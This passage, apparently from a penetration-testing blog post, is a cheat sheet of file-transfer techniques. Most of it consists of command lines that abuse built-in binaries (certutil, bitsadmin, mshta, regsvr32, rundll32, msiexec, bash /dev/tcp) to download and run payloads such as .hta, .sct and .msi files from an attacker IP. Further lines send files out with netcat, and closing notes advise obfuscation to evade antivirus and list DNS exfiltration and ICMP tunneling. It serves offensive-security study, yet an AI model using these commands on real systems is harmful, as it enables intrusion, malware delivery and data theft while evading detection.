+<h2 id="LOLBAS-GTFOBins"><a href="#LOLBAS-GTFOBins" class="headerlink" title="LOLBAS &#x2F; GTFOBins"></a>LOLBAS &#x2F; GTFOBins</h2><h3 id="Windows-LOLBAS-Binaries"><a href="#Windows-LOLBAS-Binaries" class="headerlink" title="Windows LOLBAS Binaries"></a>Windows LOLBAS Binaries</h3><h4 id="Certutil-1"><a href="#Certutil-1" class="headerlink" title="Certutil"></a>Certutil</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span>/nc.exe nc.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="Bitsadmin-1"><a href="#Bitsadmin-1" class="headerlink" title="Bitsadmin"></a>Bitsadmin</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer job /priority foreground http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span>/nc.exe C:\Users\Public\nc.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="Mshta"><a href="#Mshta" class="headerlink" title="Mshta"></a>Mshta</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mshta http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span>/payload.hta</span><br></pre></td></tr></table></figure>
+
+<h4 id="Regsvr32"><a href="#Regsvr32" class="headerlink" title="Regsvr32"></a>Regsvr32</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">regsvr32 /s /n /u /i:http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span>/file.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux-GTFOBins"><a href="#Linux-GTFOBins" class="headerlink" title="Linux GTFOBins"></a>Linux GTFOBins</h3><h4 id="Wget-1"><a href="#Wget-1" class="headerlink" title="Wget"></a>Wget</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://10.10.14.5/file.txt -O /tmp/file.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="Curl-1"><a href="#Curl-1" class="headerlink" title="Curl"></a>Curl</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://10.10.14.5/file.txt -o /tmp/file.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="OpenSSL"><a href="#OpenSSL" class="headerlink" title="OpenSSL"></a>OpenSSL</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl s_client -connect 10.10.14.5:80 -quiet &gt; file.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="Nc-Netcat"><a href="#Nc-Netcat" class="headerlink" title="Nc (Netcat)"></a>Nc (Netcat)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 10.10.14.5 4444 &lt; /tmp/file.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Living-Off-the-Land"><a href="#Living-Off-the-Land" class="headerlink" title="Living Off the Land"></a>Living Off the Land</h2><h3 id="Windows-Native-Tools"><a href="#Windows-Native-Tools" class="headerlink" title="Windows Native Tools"></a>Windows Native Tools</h3><h4 id="Rundll32"><a href="#Rundll32" class="headerlink" title="Rundll32"></a>Rundll32</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span>/payload.sct&quot;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Msiexec"><a href="#Msiexec" class="headerlink" title="Msiexec"></a>Msiexec</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">msiexec /quiet /i http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span>/payload.msi</span><br></pre></td></tr></table></figure>
+
+<h4 id="Regasm-Regsvcs"><a href="#Regasm-Regsvcs" class="headerlink" title="Regasm&#x2F;Regsvcs"></a>Regasm&#x2F;Regsvcs</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">regasm.exe /U http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span>/payload.dll</span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux-Native-Tools"><a href="#Linux-Native-Tools" class="headerlink" title="Linux Native Tools"></a>Linux Native Tools</h3><h4 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;cat &lt; /dev/tcp/10.10.14.5/80 &gt; /tmp/file.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use File::Fetch; my $ff = File::Fetch-&gt;new(uri =&gt; &quot;http://10.10.14.5/file.txt&quot;); my $file = $ff-&gt;fetch() or die $ff-&gt;error;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ruby -e <span class="string">&#x27;require &quot;open-uri&quot;; download = open(&quot;http://10.10.14.5/file.txt&quot;); IO.copy_stream(download, &quot;/tmp/file.txt&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Transferring-Between-Internal-Hosts"><a href="#Transferring-Between-Internal-Hosts" class="headerlink" title="Transferring Between Internal Hosts"></a>Transferring Between Internal Hosts</h2><h3 id="Windows-to-Windows"><a href="#Windows-to-Windows" class="headerlink" title="Windows to Windows"></a>Windows to Windows</h3><h4 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># From source</span><br><span class="line"><span class="built_in">copy</span> C:\file.txt \\target\C$\Users\Public\file.txt</span><br><span class="line"></span><br><span class="line"># With credentials</span><br><span class="line"><span class="built_in">net</span> use \\target\C$ /user:domain\user password</span><br><span class="line"><span class="built_in">copy</span> C:\file.txt \\target\C$\Users\Public\file.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="RDP-Clipboard"><a href="#RDP-Clipboard" class="headerlink" title="RDP Clipboard"></a>RDP Clipboard</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Enable clipboard sharing <span class="keyword">in</span> RDP session</span><br><span class="line"># <span class="built_in">Copy</span>/paste files directly</span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux-to-Linux"><a href="#Linux-to-Linux" class="headerlink" title="Linux to Linux"></a>Linux to Linux</h3><h4 id="SCP"><a href="#SCP" class="headerlink" title="SCP"></a>SCP</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp /tmp/file.txt user@target:/tmp/file.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># On receiver</span></span><br><span class="line">nc -lvnp 4444 &gt; file.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># On sender</span></span><br><span class="line"><span class="built_in">cat</span> file.txt | nc target 4444</span><br></pre></td></tr></table></figure>
+
+<h3 id="Windows-to-Linux"><a href="#Windows-to-Linux" class="headerlink" title="Windows to Linux"></a>Windows to Linux</h3><h4 id="SCP-from-Windows"><a href="#SCP-from-Windows" class="headerlink" title="SCP from Windows"></a>SCP from Windows</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Using OpenSSH client (Windows 10+)</span></span><br><span class="line">scp C:\file.txt user@<span class="number">10.10</span>.<span class="number">10.10</span>:/tmp/file.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="SMB-from-Linux"><a href="#SMB-from-Linux" class="headerlink" title="SMB from Linux"></a>SMB from Linux</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Mount Windows share</span></span><br><span class="line">smbclient //10.10.10.10/share -U user</span><br><span class="line">get file.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux-to-Windows"><a href="#Linux-to-Windows" class="headerlink" title="Linux to Windows"></a>Linux to Windows</h3><h4 id="SMB-to-Windows"><a href="#SMB-to-Windows" class="headerlink" title="SMB to Windows"></a>SMB to Windows</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Copy to Windows share</span></span><br><span class="line">smbclient //10.10.10.10/C$ -U user</span><br><span class="line">put file.txt Users/Public/file.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><p><strong>Detection Considerations:</strong></p>
+<ul>
+<li>PowerShell downloads are heavily monitored by EDR&#x2F;AV</li>
+<li>Certutil is flagged by AMSI and most security products</li>
+<li>Use obfuscation or alternative methods in hardened environments</li>
+<li>Base64 encoding can bypass simple content filters but not behavioral detection</li>
+</ul>
+<p><strong>File Size Limitations:</strong></p>
+<ul>
+<li>Clipboard&#x2F;base64 transfers limited by command line length (8,191 chars in cmd.exe)</li>
+<li>Web shells may timeout on large file transfers</li>
+<li>Consider splitting large files or using alternative methods</li>
+</ul>
+<p><strong>Protocol Selection:</strong></p>
+<ul>
+<li>SMB is native to Windows environments and often less suspicious</li>
+<li>HTTP&#x2F;HTTPS blends with normal web traffic</li>
+<li>SSH&#x2F;SCP requires authentication but is encrypted</li>
+<li>FTP is unencrypted and easily detected</li>
+</ul>
+<p><strong>Integrity Verification:</strong></p>
+<ul>
+<li>Always verify file integrity with MD5&#x2F;SHA256 hashes</li>
+<li>Corruption can occur during transfer, especially with base64 encoding</li>
+<li>Use checksums before and after transfer</li>
+</ul>
+<p><strong>Firewall Considerations:</strong></p>
+<ul>
+<li>Outbound HTTP&#x2F;HTTPS (80&#x2F;443) usually allowed</li>
+<li>SMB (445) often blocked at network perimeter</li>
+<li>SSH (22) may be restricted</li>
+<li>Consider using allowed protocols or tunneling</li>
+</ul>
+<p><strong>Living Off the Land:</strong></p>
+<ul>
+<li>LOLBAS (Windows) and GTFOBins (Linux) provide native binary abuse techniques</li>
+<li>These methods use legitimate system binaries to avoid detection</li>
+<li>Check respective websites for full lists and usage examples</li>
+</ul>
+<p><strong>Alternative Methods:</strong></p>
+<ul>
+<li>DNS exfiltration for small amounts of data</li>
+<li>ICMP tunneling when other protocols blocked</li>
+<li>Steganography for covert data hiding</li>
+<li>Cloud storage services (Dropbox, Google Drive) if internet access available</li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
